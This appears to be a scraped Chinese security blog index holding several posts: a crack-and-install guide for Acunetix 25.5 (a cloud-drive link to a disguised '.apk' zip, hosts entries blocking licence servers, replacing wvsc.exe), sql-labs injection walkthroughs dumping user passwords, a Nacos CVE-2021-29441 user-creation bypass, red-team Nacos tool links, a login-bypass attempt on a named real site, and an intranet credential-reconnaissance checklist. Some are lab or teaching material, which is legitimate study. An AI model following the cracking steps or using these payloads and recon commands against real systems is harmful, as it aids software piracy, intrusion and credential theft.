更新了 DeepScan 以提取更多道具 添加了新的检查来检测原型污染（服务器端） 更新了 dompurify 以检测更多漏洞 更新了基于 dom 漏洞的 iframe 注入检测 更新了 XPath 注入以获得更好的覆盖范围了 修复了 Cleo Harmony/VLTrader/LexiCom RCE 检测的误报问题 修正了“Scripts\\WebApps\\drupal_3.script”中的版本比较逻辑 安全检查 为弱 ViewState 密钥添加了新的安全检查 添加了新的检查以检测 PAN-OS XSS ( CVE-2025-0133 ) 添加了一项新检查，用于检测 Citrix NetScaler 内存泄露 (CitrixBleed 2) ( CVE-2025-5777 ) 漏洞数据库（VDB）版本升级至20250708 更新了开放重定向以增加覆盖范围 为 API 添加了 JWT 身份验证绕过 添加了 SAP NetWeaver Visual Composer 无限制文件上传 ( CVE-2025-31324 ) 增加了对 Craft CMS 远程代码执行 ( CVE-2025-32432 )的检测 添加了对缺失的 X-Content-Type-Options 标头的检查 检测 Craft CMS 远程代码执行漏洞 ( CVE-2025-32432 ) 下载： 1 2 3 通过网盘分享的文件：Acunetix-v25.5.250613157.zip.apk 链接: https://pan.baidu.com/s/18gN5FnJ6KedX8ej1giI7pw 提取码: sk4s --来自百度网盘超级会员v4的分享 记得删除.apk,然后直接解压zip文件即可。\n安装： Download Zip File, password is on our post\n建议： 安装完成后， 先登录一次账号在停止服务， 执行下面操作\n在安装工具之前， 添加到 hosts 文件中 C:\\Windows\\System32\\drivers\\etc\\hosts\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 127.0.0.1 erp.acunetix.com 127.0.0.1 erp.acunetix.com. ::1 erp.acunetix.com ::1 erp.acunetix.com. 127.0.0.1 discovery-service.invicti.com 127.0.0.1 discovery-service.invicti.com. ::1 discovery-service.invicti.com ::1 discovery-service.invicti.com. 127.0.0.1 cdn.pendo.io 127.0.0.1 cdn.pendo.io. ::1 cdn.pendo.io ::1 cdn.pendo.io. 127.0.0.1 bxss.me 127.0.0.1 bxss.me. ::1 bxss.me ::1 bxss.me. 127.0.0.1 jwtsigner.invicti.com 127.0.0.1 jwtsigner.invicti.com. ::1 jwtsigner.invicti.com ::1 jwtsigner.invicti.com. 127.0.0.1 sca.acunetix.com 127.0.0.1 sca.acunetix.com. ::1 sca.acunetix.com ::1 sca.acunetix.com. 192.178.49.174 telemetry.invicti.com 192.178.49.174 telemetry.invicti.com. 2607:f8b0:402a:80a::200e telemetry.invicti.com 2607:f8b0:402a:80a::200e telemetry.invicti.com. 安装后， 让我们停止它的服务调用服务工具:(使用菜单或打开任务管理器， 转到服务选项卡)\nAcunetix Acunetix Database\n管理员运行停止服务\n或者使用命令停止 1 2 net stop \u0026#34;Acunetix Supervisor\u0026#34; net stop \u0026#34;Acunetix Database\u0026#34; 替换文件 wvsc.exe\n1 C:\\Program Files (x86)\\Acunetix\\25.1.250204093 移动两个文件\nlicense_info.Json 文件和 wa_data.dat 文件到\nC:\\ProgramData\\Acunetix\\shared\\license 目录替换将 C:/ProgramData/Acunetix/shared/license/整个文件夹设置为只读\n安装完成后登录发现需要证书， 不能扫描， 先停止服务， 将 license 下文件全部删除， 复制license_info.Json 文件和 wa_data.dat 文件进去设置只读， 再次启动服务\nNow let\u0026rsquo;s restart acunetix:\n重启服务， 成功（再次启动 Acunetix 两个服务）\nAcunetix\nAcunetix Database\nNow login back to application, and you should be able to use it :)\nEnjoy（完成）\n","date":"2025-08-30T00:00:00Z","image":"http://localhost:57441/images/20.webp","permalink":"http://localhost:57441/p/%E5%B7%A5%E5%85%B7acunetix_25.5.250613157-%E7%A0%B4%E8%A7%A3-%E5%AE%89%E8%A3%85/","title":"【工具】acunetix_25.5.250613157 破解-安装"},{"content":"引言： 不修改之前一定要在markdown换两行才能在博文里换行，实在是太烦了。\n修改： 其实只要在 hugo.yaml （也就是config.yaml）里面对应的选项里添加： hardWraps: true\n1 2 3 4 markup: goldmark: renderer: hardWraps: true 即可！！！\n","date":"2025-08-29T00:00:00Z","image":"http://localhost:57441/images/18.webp","permalink":"http://localhost:57441/p/hugohugo-stack%E4%B8%BB%E9%A2%98%E9%AD%94%E6%94%B9-%E5%8F%96%E6%B6%88-markdown-%E4%B8%A5%E6%A0%BC%E6%8D%A2%E8%A1%8C/","title":"【Hugo】hugo-stack主题魔改-取消 markdown 严格换行"},{"content":"Less-1 验证注入点：单引号报错，两个单引号闭合利用闭合方式：' \u0026lt;payload\u0026gt; --+\n1.进入第一题，显示Please input the ID as parameter with numeric value，告诉了我们参数为id\n2.构造?id=1,页面显示正常\n1 http://localhost/sqli-labs/Less-1/?id=1 3.接下来加个单引号，显示语句出错，根据报错信息可以得知参数id的值被单引号包裹\n1 http://localhost/sqli-labs/Less-1/?id=1\u0026#39; 4.构造?id=1' and '1'='1页面重新显示正常，由此判断出这题是单引号字符型注入\n1 http://localhost/sqli-labs/Less-1/?id=1\u0026#39; and \u0026#39;1\u0026#39;=\u0026#39;1 5.构造?id=1' order by 1 --+通过order by子句来判断该数据表的字段数，页面显示正常。\n1 http://localhost/sqli-labs/Less-1/?id=1\u0026#39; order by 1 --+ 构造?id=1' order by 4 --+页面显示错误信息，由此可知该表字段数为3\n1 http://localhost/sqli-labs/Less-1/?id=1\u0026#39; order by 4 --+ 6.构造?id=-1' union select 1,2,3 --+判断出回显点为该表的第二、三字段\n1 http://localhost/sqli-labs/Less-1/?id=-1\u0026#39; union select 1,2,3 --+ 7.构造?id=-1' union select 1,2,database() --+知道了数据库名为security\n1 http://localhost/sqli-labs/Less-1/?id=-1\u0026#39; union select 1,2,database() --+ 8.构造\n1 ?id=-1\u0026#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39; --+ 在数据库information_schema中的tables表里查询出security数据库的表有：emails,referers,uagents,users\n9.构造\n1 http://localhost/sqli-labs/Less-1/?id=-1\u0026#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; --+ 在数据库information_schema中的columns里查找出数据库security中的users表的全部字段\n10.构造\n1 ?id=-1\u0026#39; union select 1,group_concat(username),group_concat(password) from users --+ 爆出所有的用户名和密码\nLess-2 验证注入点：单引号报错，不用闭合可执行 SQL语句利用闭合方式：\u0026lt;payload\u0026gt;\n与第一关基本一样，就 id 不用闭合\n1.进入第二题，显示Please input the ID as parameter with numeric value，告诉了我们参数为id\n2.构造?id=1,页面显示正常\n1 http://localhost/sqli-labs/Less-2/?id=1 3.接下来加个单引号，显示语句出错，根据报错信息可以得知是单引号影响了SQL语句的闭合，由此判断出这题是数字型注入\n1 http://localhost/sqli-labs/Less-2/?id=1\u0026#39; 4.构造?id=1 order by 3 --+通过order by子句来判断该数据表的字段数\n1 http://localhost/sqli-labs/Less-2/?id=1 order by 3 --+ ![[Pasted image 20250313162025.png]]\n构造?id=1 order by 4 --+页面报错，由此可知该表字段数为3\n1 http://localhost/sqli-labs/Less-2/?id=1 order by 4 --+ ![[Pasted image 20250313162128.png]]\n5.构造?id=-1 union select 1,2,3 --+判断出回显点为该表的第二、三字段\n1 http://localhost/sqli-labs/Less-2/?id=1 union select 1,2,3 --+ 6.构造?id=-1 union select 1,2,database() --+知道了数据库名为security\n1 http://localhost/sqli-labs/Less-2/?id=-1 union select 1,2,database() --+ 7.构造\n1 http://localhost/sqli-labs/Less-2/?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39; --+ 在数据库information_schema中的tables表里查询出security数据库的表有：emails,referers,uagents,users\n8.构造\n1 ?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; --+ 在数据库information_schema中的columns里查找出数据库security中的users表的全部字段\n9.构造\n1 ?id=-1 union select 1,group_concat(username),group_concat(password) from users --+ 爆出所有的用户名和密码\nLess-3 验证注入点：单引号报错，两个单引号闭合利用闭合方式：') \u0026lt;payload\u0026gt; --+\n也是闭合符号不一样\n1.进入第三题，显示Please input the ID as parameter with numeric value，告诉了我们参数为id\n2.构造?id=1,页面显示正常。\n1 http://localhost/sqli-labs/Less-3/?id=1 ![[Pasted image 20250313163018.png]]\n3.接下来加个单引号，显示语句出错，根据报错信息可以得知参数id的值被单引号和括号包裹\n1 http://localhost/sqli-labs/Less-3/?id=1\u0026#39; 4.构造?id=1') order by 3 --+通过order by子句来判断该数据表的字段数\n1 http://localhost/sqli-labs/Less-3/?id=1\u0026#39;) order by 3 --+ ![[Pasted image 20250313163156.png]]\n构造?id=1') order by 4 --+页面报错，由此可知该表字段数为3\n5.构造?id=-1') union select 1,2,3 --+判断出回显点为该表的第二、三字段\n1 http://localhost/sqli-labs/Less-3/?id=1\u0026#39;) union select 1,2,3 --+ ![[Pasted image 20250313163335.png]]\n6.构造?id=-1') union select 1,2,database() --+知道了数据库名为security\n1 http://localhost/sqli-labs/Less-3/?id=-1\u0026#39;) union select 1,2,database() --+ 7.构造\n1 http://localhost/sqli-labs/Less-3/?id=-1\u0026#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39; --+ 在数据库information_schema中的tables表里查询出security数据库的表有：emails,referers,uagents,users\n8.构造\n1 ?id=-1\u0026#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; --+ 在数据库information_schema中的columns里查找出数据库security中的users表的全部字段\n![[Pasted image 20250313165309.png]]\n9.构造\n1 ?id=-1\u0026#39;) union select 1,group_concat(username),group_concat(password) from users --+ 爆出所有的用户名和密码\nLess-4 验证注入点：双引号报错，两个双引号闭合利用闭合方式：\u0026quot;) \u0026lt;payload\u0026gt; --+\n也是闭合符号不一样\n1.进入第四题，显示Please input the ID as parameter with numeric value，告诉了我们参数为id\n2.构造?id=1,页面显示正常\n3.接下来加个双引号，显示语句出错，根据报错信息可以得知参数id的值被双引号和括号包裹\n4.构造?id=1\u0026quot;) order by 3 --+通过order by子句来判断该数据表的字段数,页面显示正常\n构造?id=1\u0026quot;) order by 4 --+页面报错，由此可知该表字段数为3\n1 http://localhost/sqli-labs/Less-4/?id=1\u0026#34;) order by 3 --+ 5.构造?id=-1\u0026quot;) union select 1,2,3 --+判断出回显点为该表的第二、三字段\n6.构造?id=-1\u0026quot;) union select 1,2,database() --+知道了数据库名为security\n1 http://localhost/sqli-labs/Less-4/?id=-1\u0026#34;) union select 1,2,database() --+ ![[Pasted image 20250313170055.png]]\n7.构造\n1 ?id=-1\u0026#34;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39; --+ 在数据库information_schema中的tables表里查询出security数据库的表有：emails,referers,uagents,users\n8.构造\n1 ?id=-1\u0026#34;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; --+ 在数据库information_schema中的columns里查找出数据库security中的users表的全部字段\n9.构造\n1 ?id=-1\u0026#34;) union select 1,group_concat(username),group_concat(password) from users --+ 爆出所有的用户名和密码\nLess-5 验证注入点：单引号报错，两个单引号闭合利用闭合方式：' \u0026lt;payload\u0026gt; --+\n考察点：报错注入\n1.进入第五题，显示Please input the ID as parameter with numeric value，告诉了我们参数为id\n2.构造?id=1,页面显示You are in...........，不再像前4题显示name和passwd\n1 http://localhost/sqli-labs/Less-5/?id=1 3.接下来加个单引号，显示语句出错，根据报错信息可以得知参数id的值被单引号包裹\n1 http://localhost/sqli-labs/Less-5/?id=1\u0026#39; 4.构造?id=1‘ order by 1 --+通过order by子句来判断该数据表的字段数，页面显示正常\n1 http://localhost/sqli-labs/Less-5/?id=1\u0026#39; order by 1 --+ 构造?id=1' order by 3 --+页面显示正常\n构造?id=1' order by 4 --+页面报错，由此可知该表字段数为3\n1 http://localhost/sqli-labs/Less-5/?id=1\u0026#39; order by 3 --+ 5.构造?id=-1' union select 1,2,3 --+判断回显点，结果发现行不通\n1 http://localhost/sqli-labs/Less-5/?id=1\u0026#39; union select 1,2,3 --+ 6.构造?id=1' and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) --+发现可以进行盲注\n1 http://localhost/sqli-labs/Less-5/?id=1\u0026#39; and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) --+ 7.也可以使用length()来判断数据库名的长度\n1 http://192.168.58.128/sqli-labs/Less-5/?id=1\u0026#39;and length((select database()))\u0026gt;7 --+ ","date":"2025-08-29T00:00:00Z","image":"http://localhost:57441/images/19.webp","permalink":"http://localhost:57441/p/%E9%9D%B6%E5%9C%BAsql-labs-less1-5/","title":"【靶场】sql-labs-Less1-5"},{"content":"效果 修改 高度限制在 20em，并隐藏滚动条。\n增添到 ==/themes/hugo-theme-stack/assets/scss/partials/article.scss==\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 .article-content { .highlight { padding: var(--card-padding); pre { margin: initial; padding: var(--card-padding); margin: 0; width: auto; max-height: 20em; scrollbar-width: none; /* Firefox */ \u0026amp;::-webkit-scrollbar { display: none; /* Chrome Safari */ } } } } 修改完成！\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:57441/images/17.webp","permalink":"http://localhost:57441/p/hugohugo-stack%E4%B8%BB%E9%A2%98%E9%AD%94%E6%94%B9-%E5%9B%BA%E5%AE%9A%E4%BB%A3%E7%A0%81%E5%9D%97%E9%AB%98%E5%BA%A6/","title":"【Hugo】hugo-stack主题魔改-固定代码块高度"},{"content":"最终效果： 自定义修改 修改位置：\\content\\categories\\标签名\\_index.md\nindex.md文件内容：\n1 2 3 4 5 6 7 8 9 --- title: \u0026#34;Web攻防\u0026#34; description: \u0026#34;介绍\u0026#34; slug: \u0026#34;Web攻防\u0026#34; image: \u0026#34;Web攻防.webp\u0026#34; style: background: \u0026#34;#2a9d8f\u0026#34; color: \u0026#34;#fff\u0026#34; --- 修改：\n1 2 3 style: background: \u0026#34;#2a9d8f\u0026#34; color: \u0026#34;#fff\u0026#34; 颜色如下，根据自己喜欢的颜色进行修改：\n风格定位 背景色（Background） 文字色（Color） 色值说明 清新自然 #264653 #ffffff 深青绿色背景 + 纯白文字，低饱和更显柔和 温柔治愈 #e76f51 #ffffff 暖橙色背景 + 纯白文字，适合温馨场景 高级极简 #1d3557 #f1faee 藏蓝色背景 + 米白文字，避免纯白刺眼 活力明亮 #ffb703 #212121 亮黄色背景 + 深灰文字，对比强烈不刺眼 复古优雅 #8b5a2b #f5f5f5 棕褐色背景 + 米白文字，自带复古质感 冷静专业 #3a86ff #ffffff 天蓝色背景 + 纯白文字，适合商务场景 森系柔和 #43aa8b #f9fafb 浅草绿背景 + 近白文字，自然不突兀 神秘高级 #2b2d42 #edf2f4 深灰蓝背景 + 浅灰文字，低调有质感 甜美清新 #ff6b6b #ffffff 浅粉色背景 + 纯白文字，适合女性向场景 沉稳大气 #0077b6 #ffffff 深海蓝背景 + 纯白文字，显专业且庄重 只需要修改：background和color就可以了。\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:57441/images/11.webp","permalink":"http://localhost:57441/p/hugohugo-stack%E4%B8%BB%E9%A2%98%E9%AD%94%E6%94%B9-%E5%BD%92%E6%A1%A3%E6%A0%87%E7%AD%BE%E9%A2%9C%E8%89%B2%E8%87%AA%E5%AE%9A%E4%B9%89/","title":"【Hugo】hugo-stack主题魔改-归档标签颜色自定义"},{"content":"1. 漏洞概述 2020年12月29日，Nacos官⽅在github发布的issue中披露Alibaba Nacos 存在⼀个由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进⾏任意操作，包括创建新⽤户并进⾏登录后操作。\n2. 影响版本 Nacos \u0026lt;= 2.0.0-ALPHA.1\n3. 环境搭建 Nacos下载地址(github):\n1 https: github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1 Windows搭建：\n进入github下载地址后下载版本： 1 nacos-server-2.0.0-ALPHA.1.zip 解压出来后进入bin目录： 1 D:\\TargetDrone\\nacos-server-2.0.0-ALPHA.1\\nacos-server-2.0.0-ALPHA.1\\nacos\\bin 输入在当前文件夹下使用打开cmd窗口，输入命令： 1 .\\startup.cmd -m standalone 然后访问网站： 1 2 http://192.168.31.134:8848/nacos/ 192.168.31.134：自己的内网IP地址 5. 默认账号密码\n1 nacos/nacos 即可。\n4. 漏洞复现 漏洞路径 1 http: your-ip:8848/nacos/v1/auth/users?pageNo=1\u0026amp;pageSize=1 2. 虽然有password了, 但是是加盐过的,解密不了，从上图可以发现，⽬前有⼀个⽤户nacos 漏洞利⽤，访问\n1 http: your-ip:8848/nacos/v1/auth/users PSOT传参：\n1 username=test1\u0026amp;password=test1 UA 头：\n1 Nacos-Server 发送POST请求，返回码200，创建⽤户成功~！\n返回Nacos登录界面：\n使用账号/密码：\n1 test1/test1 关闭环境：\n1 ./shutdown.sh 5. 漏洞分析 Nacos-Server是⽤来进⾏服务间的通信的⽩名单。⽐如服务A要访问服务B，如何知道服务A是服务，只需要在服务A访问服务B的时候UA上写成 Nacos-Server 即可。\n正因为这样，所以当我们UA恶意改为Nacos-Server的时候，就会被误以为是服务间的通信，因此在⽩名单当中，绕过的认证。\n这⾥⽤的是nacos-2.0.0-ALPHA.1的代码进⾏分析\n关键代码在该⽂件下:\n1 2 /nacos-2.0.0-ALPHA.1/naming/src/main/java/com/alibaba/nacos/naming/web/TrafficRevise Filter.java TrafficReviseFilter继承了Filter⽤来处理请求，⽽⾥⾯的doFilter的就很明确了。注释中写道，当接收到其他节点服务的请求时应该被通过，如何验证是其他服务。\n就是很简单的⼀个对于UA的⼀个判断逻辑\n这个Constants.NACOS_SERVER_HEADER跟踪⼀下，正是Nacos-Server 经过这⼀层的验证，那么则进⼊到filterChain 过滤器链中的下⼀个filter过滤器，继续接下来的请求。\n6. 漏洞修复 若业务环境允许，使⽤⽩名单限制相关web项⽬的访问来降低⻛险。 官⽅已发布最新安全版本，请及时下载升级⾄安全版本。\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:57441/images/15.webp","permalink":"http://localhost:57441/p/nacoscve-2021-29441-nacos-%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/","title":"【Nacos】CVE-2021-29441 Nacos 权限认证绕过漏洞"},{"content":"0x00 前置知识 1. 平台语法 1 2 3 4 5 hunter语法： app.name=\u0026#34;Nacos\u0026#34; fofa语法： title=\u0026#34;nacos\u0026#34; app=\u0026#34;nacos\u0026#34; 端口：port=\u0026ldquo;8848\u0026rdquo;\n2. 信息收集 资产少的情况下：\n如果没有明显特征，那就通过被动扫描器，如：burp的插件TsojanScan，HAE，logger++等\n1 https://github.com/Tsojan/TsojanScan 资产多的情况下：\n那我们就直接使用指纹识别工具EHole_magic\n1 https://comm.pgpsec.cn/54.html 可以特定⼀些⽬录如nacos、/webroot/decision/login等等，进⾏更加精确的扫描进⾏精准的识别。（但网站收费）\n批量漏洞检测工具：\nNacosExploit\n1 https://github.com/h0ny/NacosExploit 漏洞检测：\n3. 漏洞利用点 Nacos 默认帐户名密码：\n1 nacos/nacos 0x01 工具 反序列化漏洞利⽤⼯具\n1 https://github.com/c0olw/NacosRce/releases/tag/v0.5 哥斯拉nacos后渗透插件\n1 https://github.com/pap1rman/postnacos 综合利⽤,且gui版本\n1 https://github.com/charonlight/NacosExploitGUI ","date":"2025-08-28T00:00:00Z","image":"http://localhost:57441/images/10.webp","permalink":"http://localhost:57441/p/nacosnacos%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%96%B9%E6%B3%95/","title":"【Nacos】Nacos红队打点方法"},{"content":"开局 首先先拿到一个站点：\n1 2 3 4 5 whjwcm.cn 通过fofa，鹰图等等找资产： domain=\u0026#34;whjwcm.cn\u0026#34; 找到一个图文盒子后台登录页面： https://wss.whjwcm.cn 这时候发现#号：\n1 2 https://wss.whjwcm.cn/manage/#/login?redirect=%2Fplat #/login?redirect=%2Fplat 思路一 0x01 进入后台首先尝试弱口令 一般就是最简单的admin\n0x02 看数据包 修改error为0 通过抓包可以看到返回信息：\n1 2 3 4 5 6 { \u0026#34;error\u0026#34;:1, \u0026#34;msg\u0026#34;:\u0026#34;\\u7528\\u6237\\u540d\\u6216\\u5bc6\\u7801\\u4e0d\\u6b63\\u786e\u0026#34;, \u0026#34;data\u0026#34;:\u0026#34;\u0026#34; } 一共三个参数，都可以试一下： 接触该请求，拦截一下相应信息对error进行修改。\n这里可以看到：error和data数据都可以进行修改，然后进行测试。\n发现进入了/admin/user/info，但Cookie认证是一个未知的，这里可以看出已经没什么用了。\n修改error为200 这里可以将error修改为200，试一下是否可以绕过。\n发现还是不行，这里思路也没了。\ndata进行测试 尝试再data参数中添加一下值，看一下是否可以绕过，\n发现还是不行:\n这时候就可以看一下js文件了，是否有关于这两个参数的代码逻辑问题。\njs文件查找参数 这里看出从js文件中找到了一个data对应的参数值，也是可以进行尝试的。\n但经过测试还是不行，但也是一个思路，后续遇到了可以进行尝试。\n丢弃req数据包 通过劫持req的数据包，丢弃掉，有的时候也可以卡进去，但是这里发现，并不行，这时候这种思路也不行了。\n总结 1 这时候再尝试逻辑漏洞就不现实了，现在这种带#的这种漏洞就不多了。 思路二 如果遇到Cookie:admin-token=未知\n如果遇到一个后台登录页面，抓包发现一个error返回参数为1，然后修改参数0，进行尝试发送后，遇到返回数据中有Cookie:admin-token=未知后，我们的思路是：\n找小程序的token/Cookie，抓取过去进行尝试 找其他系统的弱口令进行尝试修改。 ","date":"2025-08-28T00:00:00Z","image":"http://localhost:57441/images/12.webp","permalink":"http://localhost:57441/p/web%E6%94%BB%E9%98%B2%E5%B8%B8%E8%A7%81web%E6%94%BB%E9%98%B2%E7%99%BB%E5%BD%95%E6%A1%86%E6%89%93%E6%B3%95-01/","title":"【Web攻防】常见Web攻防登录框打法-01"},{"content":"1. 下载地址： 1 https://github.com/shmilylty/OneForAll 2. 使用： 首先把requirements.txt下载下来。\n1 pip install -r .\\requirements.txt 然后直接使用即可\n1 python.exe .\\oneforall.py --target xiyoupark.com run 结果会导出到results文件夹下。\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:57441/images/4.webp","permalink":"http://localhost:57441/p/%E5%B7%A5%E5%85%B7oneforall%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"【工具】OneForAll子域名收集工具的使用"},{"content":"部署安装网址： 1 https://blog.csdn.net/weixin_45950429/article/details/107069404 下载地址： 1 2 3 通过网盘分享的文件：WindowsServer 2003.iso 链接: https://pan.baidu.com/s/1_VmXyNxI5kyouSAMjMl5wQ 提取码: 1234 --来自百度网盘超级会员v2的分享 步骤一： 打开VMware,点击我的主页，点击创建新的虚拟机：\n这里选择稍后安装操作系统，然后点击“下一步”\n客户机操作系统选择“Microsoft Windows(W)\u0026quot;，版本的话，你下载的是什么版本你就安装什么版本，我最前面发的是Windows Server 2003 Standard Edition版本的额，也就是32位的。然后点击”下一步”\n虚拟机名称，我这里就默认了，位置一定要自己选择，把它放在内存空间充足的磁盘。\n这里你可以默认40GB，我避免要做的东西多，所以设了“60GB”，下面选择“将虚拟磁盘拆分成多个文件（M），然后点击下一步\n点击自定义硬件，里面的打印机极少用，可以选择移除，然后点击CD，浏览放入映像文件\n点击关闭之后会自动回到这页，点击“完成”\n完成之后就会生成一个虚拟机\n步骤二： 放入镜像之后的安装过程\n点击“开启此虚拟机\u0026quot;,随后就会进入这个页面，开始等待\n点击\u0026quot;Enter\u0026quot;键进行安装，再等待\n点击选择”用NTFS文件系统格式化磁盘分区（快），随后点击\u0026quot;Enter\u0026quot;键继续\n安装格式化，等待\n等待\n出现这个画面，点击“下一步”\n点击我接受这个协议，点击“下一步”\n继续等待，出现这个画面，点击“下一步”，自定义输入名称，点击“下一步”\n这里服务器修改为“500”，然后点击“下一步”\n一定记得设置自己记得住的密码，等一下安装好后开机需要使用\n默认点击下一步，等待\n出现这个画面，点击“典型设置”，点击“下一步”\n选择“不，此计算机不在网络上，或者再没有域的网络上，把此计算机作为下面工作组的一个成员（W)\u0026quot;, 点击”下一步“\n步骤三： 出现这个画面时，点击\u0026quot;完成”，随后点击“是”\n“x\u0026quot;掉\n在 开始–我的电脑–属性-自动更新–点击关闭自动更新(T)\n完成 你可以在桌面点击右键–属性–设置–修改分辨率即可修改屏幕大小\n结束完成！！！\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:57441/images/5.webp","permalink":"http://localhost:57441/p/%E5%B7%A5%E5%85%B7windows-server-2003%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2/","title":"【工具】windows server 2003安装部署"},{"content":"0x01 查看端口状态 命令:\n1 netstat -ano 连接状态有一下几种\nLISTENING：表示监听 ，表示这个端口处于开放状态， 可以提供服务 ESTABLISHED\u0026quot;：表示是对方与你已经连接 正在通信交换数据 CLOSING：表示关闭的 表示端口人为或者防火墙使其关闭(也许服务被卸载) TIME WAIT ：表示正在等待连接 就是你正在向该端口发送请求连接状态\n通过netstat查看网络连接，每条连接后面都有一个PID号，根据PID号可以定位出是哪个进程在监听这个端口 直接查看程序与外部地址的已建立的连接情况 命令:\n1 netstat -b 显示在创建每个连接或侦听端口时涉及的可执行程序，需要管理员权限，这条程序对于查找可疑程序非常有帮助\n或者我们先通过查看网络连接状态，查看pid再通过PID定位程序\n查看已建立的连接 通过如下命令我们优先查找已建立的连接，看是否存在可疑的连接\n1 netstat -ano|findstr \u0026#34;ES\u0026#34; 如下，我们发现一条可疑tcp连接，本机与一个外部的地址的一个特殊端口已经建立了连接，pid号为5840。（我们要着重观察本地是否与外部地址的特殊端口进行连接）\n0x02 根据PID定位进程 命令:\n1 tasklist tasklist ：显示运行在本地或远程计算机上的所有进程。如下图显示了进程对应的PID号\nPID定位进程 上面我们发现了一个可疑的TCP连接，pid号为5840，现在通过这pid定位程序\n1 tasklist | findstr \u0026#34;5840\u0026#34; 如下可知，5840对一个的程序为payload2.exe\n获取进程的全路径 命令:\n1 wmic process | findstr \u0026#34;payload2.exe\u0026#34; 如下，显示了程序的全路径\n或者通过任务管理器找到该进程，再打开进程所在路径\n杀死进程 1 taskkill /f /pid pid号 # /f为强制的意思 注：以上可疑程序的payload为MSF的payload。CS的payload通过上述方式并不能查看到，可知CS的payload隐蔽性还是很高的。\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:57441/images/6.webp","permalink":"http://localhost:57441/p/%E8%93%9D%E9%98%9Fwindows-%E7%AB%AF%E5%8F%A3%E6%8E%92%E6%9F%A5%E6%A1%88%E4%BE%8B/","title":"【蓝队】windows 端口排查案例"},{"content":"0x00 前置 当红队渗透测试人员突破边界进入内网战场，面对复杂网络环境时，首要任务是构建四维立体情报模型，通过体系研判完成内网基础信息收集。这套基于实战场景的专业分析框架，可精准回答渗透过程中四个核心定位问题：\n我是谁？\u0026ndash;主机身份与特权边界确认。\n这是哪？\u0026ndash;对目前机器处网络环境的拓扑结构进行分析和判断。\n我在哪？\u0026ndash;对目前机器所处伪造区域的判断。\n谁在哪？\u0026ndash;对比钱机器反防御技术识别网络中的安全监控节点。\n0x01 要收集的信息 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 操作系统 当权用户权限 内网IP段（网卡信息） 杀毒软件（AV） 端口开放情况 系统补丁 网络状态 共享文件夹 远程信息 服务信息 软件列表 计划任务 启动项 系统日志 防火墙规则 网络代理信息 内网OA办公系统 邮件服务器 网络监控系统 财务应用系统 核心产品源码（SVN/Git 服务器） 管理员密码 浏览器密码 cookie 无线密码 数据库密码 VPN历史密码 Teamview 历史密码 其他用户 session 3389 连接记录 IPC$ 连接记录 各用户回收站信息 用户列表 host 文件 DNS 缓存信息 补丁信息 端口信息 账户密码策略 账号锁定策略 Web 服务器配置文件 Web 服务器日志 ...... 0x02 Windows信息收集 1. 主机信息收集 查看当前用户以及当前用户所在组，所拥有的权限。\n1 shell whoami /all 2. 网卡和IP信息收集 查看网卡等基本网络配置信息，主要留意Ethernet0以及Ethernet1，这个网卡，记录了可以通的网段信息\n1 shell ipconfig /all 可以看出当前是两个网卡，并且主DNS是一个域名（这里环境有问题，一般看DNS是一个域名，既是域环境。），一般来说只有域机器才会有域名显示，而在工作组下显示的是空：\n3. 查看系统详情信息 可以查看网卡，系统，补丁信息\n1 shell systeminfo 我们可以通过该命令获得了系统的信息，就可以直接使用下面网站获取exp。\n1 http://bypass.tidesec.com/exp/ 直接复制粘贴过来即可\n4. 查看操作系统和版本信息 1 2 3 4 英文版系统用这个命令： shell systeminfo | findstr /B /C:\u0026#34;OS Name\u0026#34; /C:\u0026#34;OS Version\u0026#34; 中文版系统用这个命令： shell systeminfo | findstr /B /C:\u0026#34;OS 名称\u0026#34; /C:\u0026#34;OS 版本\u0026#34; 5. 查看系统体系结构 检查系统架构（AMD64或者x86）-\u0026gt;影响后续工具选择\n1 shell echo %PROCESSOR_ARCHITECTURE% 6. 主机路由信息 可以查看网络目标，都是主机可以直接访问到的机器\n1 shell route print 7. ARP缓存信息 1 shell arp -a 8. DNS缓存信息 1 shell ipconfig /displaydns 9. Host文件信息 1 shell type C:\\windows\\System32\\drivers\\etc\\hosts 10. 端口连接信息 可以查看当前主机的端口链接情况，一级当前主机与网络中的主机连接建立情况，不仅有公网主机还有内网主机。\n1 shell netstat -ano 11. 会话连接 可以查看主机与客户机之间的会话连接\n1 shell net session 12. 查看当前保存的登录凭证，也能看到通的ip 1 shell cmdkey /l 13. 查看当前主机开启的共享列表 1 shell net share 14. 远程相关信息 1 2 3 4 相关链接： http://bypass.tidesec.com/bycms 命令： shell tasklist 15. 查看当前主机与网络中的其他主机建立的共享链接 1 shell net use 16. 查看主机进程信息 1 